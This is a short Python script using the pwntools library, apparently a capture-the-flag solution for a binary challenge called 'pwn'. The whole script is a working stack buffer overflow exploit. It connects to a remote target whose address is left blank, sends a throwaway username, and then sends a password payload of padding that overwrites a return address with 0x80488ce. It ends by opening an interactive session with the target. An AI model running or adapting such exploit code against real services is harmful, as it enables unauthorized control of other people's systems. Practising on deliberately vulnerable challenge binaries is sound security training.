from pwn import *
#p = process('./pwn')
p = remote()

payload = b'a' * (0x19 + 4) + p32(0x80488ce)
payload = payload.ljust(0x107, b'a')
p.sendafter(b'username', b'a')
p.sendafter(b'passwd', payload)

p.interactive()
